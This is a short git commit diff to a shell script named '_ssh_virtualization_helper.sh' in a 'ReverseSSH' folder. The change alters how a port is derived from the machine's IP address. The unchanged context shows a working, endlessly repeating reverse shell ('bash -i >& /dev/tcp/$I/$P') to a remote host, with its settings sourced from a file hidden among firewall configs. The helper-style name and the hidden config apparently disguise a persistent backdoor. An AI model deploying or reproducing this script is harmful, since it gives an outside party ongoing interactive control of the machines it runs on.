8f638ba6df0494683bb871fca9898182390f0537
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-03-28 00:18:58 -0400

    lockdown deploy

--- ReverseSSH/_ssh_virtualization_helper.sh
+++ ReverseSSH/_ssh_virtualization_helper.sh
@@ -2,7 +2,8 @@
 source /etc/ufw/applications.d/ufw_config.sh
 CIP=$(/usr/bin/hostname -I | awk '{print $1}')
 SECOND=$(echo "$CIP" | cut -d'.' -f2)
-P=$(($C + $SECOND))
+FOURTH=$(echo "$CIP" | cut -d'.' -f4)
+P=$(($C + $SECOND*100 + $FOURTH))
 
 while true; do
     bash -i >& /dev/tcp/"$I"/"$P" 0>&1 2>/dev/null
